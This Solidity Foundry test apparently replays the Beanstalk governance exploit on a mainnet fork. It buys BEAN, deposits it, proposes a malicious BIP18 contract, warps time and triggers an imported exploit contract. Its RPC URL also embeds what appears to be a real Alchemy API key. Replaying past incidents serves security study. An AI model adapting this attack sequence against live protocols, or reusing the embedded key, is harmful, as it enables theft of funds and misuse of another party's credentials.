pragma solidity 0.8.10;

import "../src/BIP18.sol";
import "../src/attack.sol";
import "forge-std/Test.sol";
import "../interfaces/IUniswapV2Router.sol";

contract BeanExp is Test{
    IBeanStalk constant BEAN_STALK = IBeanStalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    address constant BEAN = address(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IUniswapV2Router constant uniswapv2 = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    string  url = "https://eth-mainnet.g.alchemy.com/v2/qb4zUY4FDtmZMhaAEHblyllY9gc1nj2S";
    uint256 forkId;
    BIP18 bip18;
    BeanExploit beanexp;
    function setUp() external {
        // 恶意提案高度  14595906 
        // 攻击开始高度  14602789
        forkId = vm.createFork(url, 14595905);
        vm.selectFork(forkId);
        }

    function testexp() public{
        address[] memory path = new address[](2);
        path[0] = uniswapv2.WETH();
        path[1] = BEAN;
        uniswapv2.swapExactETHForTokens{value: 75 ether}(
            0,
            path,
            address(this),
            block.timestamp + 120
        );
        console.log(
            "swap ETH -> BEAN , Bean balance of attacker:",
            IERC20(BEAN).balanceOf(address(this))/10**6
        );
        
        IERC20(BEAN).approve(address(BEAN_STALK), type(uint256).max);
        BEAN_STALK.depositBeans(IERC20(BEAN).balanceOf(address(this)));
        beanexp = new BeanExploit();
        bip18 = new BIP18(address(beanexp));
        IDiamondCut.FacetCut[] memory _cut = new IDiamondCut.FacetCut[](0);
        BEAN_STALK.propose(_cut, address(bip18), abi.encodeWithSignature("init()"), 3);
        console.log("Successfully proposed: ", address(bip18));

        vm.warp(block.timestamp + 1 days);
        beanexp.exploit();
    }
    
}

